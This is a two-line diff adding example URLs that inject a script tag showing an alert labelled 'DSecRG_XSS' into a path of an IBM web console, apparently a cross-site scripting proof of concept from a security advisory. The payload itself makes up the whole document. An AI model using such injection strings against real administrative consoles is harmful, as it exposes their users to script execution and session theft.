@@ -1,0 +1,2 @@
+http://www.example.com/ibm/console/<script>alert('DSecRG_XSS')</script>
+http://www.example.com/ibm/console/<script>alert('DSecRG_XSS')</script>.jsp
